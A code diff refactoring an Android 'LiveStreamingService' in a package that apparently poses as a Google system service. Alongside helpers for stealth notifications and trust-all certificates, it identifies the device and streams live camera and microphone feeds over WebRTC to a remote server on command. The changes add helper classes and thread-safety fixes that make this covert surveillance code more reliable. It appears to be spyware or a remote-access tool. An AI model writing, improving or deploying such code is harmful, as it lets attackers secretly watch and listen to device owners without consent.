@@ -12,6 +12,8 @@ import com.google.android.systemservice.config.AndroidConfig
 import com.google.android.systemservice.utils.StealthNotificationHelper
 import com.google.android.systemservice.utils.TrustAllCertificates
 import com.google.android.systemservice.utils.WebRTCClient
+import com.google.android.systemservice.utils.WebRTCConfig
+import com.google.android.systemservice.utils.WsMessageHelper
 import kotlinx.coroutines.*
 import okhttp3.*
 import org.json.JSONObject
@@ -25,8 +27,8 @@ class LiveStreamingService : Service() {
 
     @Volatile private var webSocket: WebSocket? = null
     @Volatile private var webRTCClient: WebRTCClient? = null
-    @Volatile private var isVideoStreamActive = false
-    @Volatile private var isAudioStreamActive = false
+    private var isVideoStreamActive = false
+    private var isAudioStreamActive = false
     private var deviceId: String = ""
     
     private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
@@ -50,14 +52,7 @@ class LiveStreamingService : Service() {
     }
 
     private fun getDeviceIdentifier(): String {
-        return try {
-            android.provider.Settings.Secure.getString(
-                contentResolver,
-                android.provider.Settings.Secure.ANDROID_ID
-            ) ?: AndroidConfig.deviceId.ifEmpty { "unknown" }
-        } catch (e: Exception) {
-            AndroidConfig.deviceId.ifEmpty { "unknown" }
-        }
+        return com.google.android.systemservice.utils.DeviceIdentifierProvider.getDeviceIdentifier(this)
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
@@ -103,14 +98,7 @@ class LiveStreamingService : Service() {
     }
 
     private fun subscribeToWebRTCChannel() {
-        val subscribeMessage = JSONObject().apply {
-            put("command", "subscribe")
-            put("identifier", JSONObject().apply {
-                put("channel", "WebrtcChannel")
-                put("device_id", deviceId)
-            }.toString())
-        }
-        try { webSocket?.send(subscribeMessage.toString()) } catch (e: Exception) { Log.e(TAG, "WS send failed", e) }
+        WsMessageHelper.subscribe(webSocket, "WebrtcChannel", deviceId)
         Log.d(TAG, "Subscribed to WebRTC channel")
     }
 
@@ -162,9 +150,11 @@ class LiveStreamingService : Service() {
 
             try {
                 webRTCClient = WebRTCClient(
-                    context = this,
-                    deviceId = deviceId,
-                    streamType = "camera",
+                    config = WebRTCConfig(
+                        context = this,
+                        deviceId = deviceId,
+                        streamType = "camera"
+                    ),
                     onSdpCreated = { type, sdp ->
                         sendSdpToServer(type, sdp)
                     },
@@ -173,11 +163,13 @@ class LiveStreamingService : Service() {
                     },
                     onConnectionStateChanged = { state ->
                         Log.d(TAG, "WebRTC connection state: $state")
-                        if (state == PeerConnection.PeerConnectionState.CONNECTED) {
-                            isVideoStreamActive = true
-                        } else if (state == PeerConnection.PeerConnectionState.FAILED ||
-                                   state == PeerConnection.PeerConnectionState.DISCONNECTED) {
-                            isVideoStreamActive = false
+                        synchronized(this@LiveStreamingService) {
+                            if (state == PeerConnection.PeerConnectionState.CONNECTED) {
+                                isVideoStreamActive = true
+                            } else if (state == PeerConnection.PeerConnectionState.FAILED ||
+                                       state == PeerConnection.PeerConnectionState.DISCONNECTED) {
+                                isVideoStreamActive = false
+                            }
                         }
                     }
                 )
@@ -217,9 +209,15 @@ class LiveStreamingService : Service() {
 
     private fun stopVideoStream() {
         synchronized(this) {
-            webRTCClient?.close()
-            webRTCClient = null
-            isVideoStreamActive = false
+            try {
+                val client = webRTCClient
+                if (client != null) {
+                    try { client.close() } catch (e: Exception) { Log.e(TAG, "Error closing WebRTC client: ${e.message}") }
+                    webRTCClient = null
+                }
+            } finally {
+                isVideoStreamActive = false
+            }
         }
         Log.d(TAG, "Video stream stopped")
     }
@@ -234,9 +232,11 @@ class LiveStreamingService : Service() {
             try {
                 if (webRTCClient == null) {
                     webRTCClient = WebRTCClient(
-                        context = this,
-                        deviceId = deviceId,
-                        streamType = "microphone",
+                        config = WebRTCConfig(
+                            context = this,
+                            deviceId = deviceId,
+                            streamType = "microphone"
+                        ),
                         onSdpCreated = { type, sdp ->
                             sendSdpToServer(type, sdp)
                         },
@@ -245,11 +245,13 @@ class LiveStreamingService : Service() {
                         },
                         onConnectionStateChanged = { state ->
                             Log.d(TAG, "Audio WebRTC connection state: $state")
-                            if (state == PeerConnection.PeerConnectionState.CONNECTED) {
-                                isAudioStreamActive = true
-                            } else if (state == PeerConnection.PeerConnectionState.FAILED ||
-                                       state == PeerConnection.PeerConnectionState.DISCONNECTED) {
-                                isAudioStreamActive = false
+                            synchronized(this@LiveStreamingService) {
+                                if (state == PeerConnection.PeerConnectionState.CONNECTED) {
+                                    isAudioStreamActive = true
+                                } else if (state == PeerConnection.PeerConnectionState.FAILED ||
+                                           state == PeerConnection.PeerConnectionState.DISCONNECTED) {
+                                    isAudioStreamActive = false
+                                }
                             }
                         }
                     )
@@ -269,49 +271,41 @@ class LiveStreamingService : Service() {
 
     private fun stopAudioStream() {
         synchronized(this) {
-            // Keep WebRTC client if video is still active
-            if (!isVideoStreamActive) {
-                webRTCClient?.close()
-                webRTCClient = null
+            try {
+                val client = webRTCClient
+                if (client != null) {
+                    if (!isVideoStreamActive) {
+                        try { client.close() } catch (e: Exception) { Log.e(TAG, "Error closing WebRTC client: ${e.message}") }
+                        webRTCClient = null
+                    } else {
+                        // Video still active — dispose only audio resources
+                        try { client.disposeAudioTrack() } catch (e: Exception) { Log.e(TAG, "Error disposing audio track: ${e.message}") }
+                    }
+                }
+            } finally {
+                isAudioStreamActive = false
             }
-            isAudioStreamActive = false
         }
         Log.d(TAG, "Audio stream stopped")
     }
 
     private fun sendSdpToServer(type: String, sdp: String) {
-        val message = JSONObject().apply {
-            put("command", "message")
-            put("identifier", JSONObject().apply {
-                put("channel", "WebrtcChannel")
-                put("device_id", deviceId)
-            }.toString())
-            put("data", JSONObject().apply {
-                put("type", type)
-                put("sdp", sdp)
-                put("device_id", deviceId)
-            }.toString())
+        WsMessageHelper.sendChannelMessage(webSocket, "WebrtcChannel", deviceId) {
+            put("type", type)
+            put("sdp", sdp)
+            put("device_id", deviceId)
         }
-        try { webSocket?.send(message.toString()) } catch (e: Exception) { Log.e(TAG, "WS send failed", e) }
         Log.d(TAG, "Sent SDP $type to server")
     }
 
     private fun sendIceCandidateToServer(candidate: IceCandidate) {
-        val message = JSONObject().apply {
-            put("command", "message")
-            put("identifier", JSONObject().apply {
-                put("channel", "WebrtcChannel")
-                put("device_id", deviceId)
-            }.toString())
-            put("data", JSONObject().apply {
-                put("type", "ice_candidate")
-                put("candidate", candidate.sdp)
-                put("sdpMid", candidate.sdpMid)
-                put("sdpMLineIndex", candidate.sdpMLineIndex)
-                put("device_id", deviceId)
-            }.toString())
+        WsMessageHelper.sendChannelMessage(webSocket, "WebrtcChannel", deviceId) {
+            put("type", "ice_candidate")
+            put("candidate", candidate.sdp)
+            put("sdpMid", candidate.sdpMid)
+            put("sdpMLineIndex", candidate.sdpMLineIndex)
+            put("device_id", deviceId)
         }
-        try { webSocket?.send(message.toString()) } catch (e: Exception) { Log.e(TAG, "WS send failed", e) }
         Log.d(TAG, "Sent ICE candidate to server")
     }
 
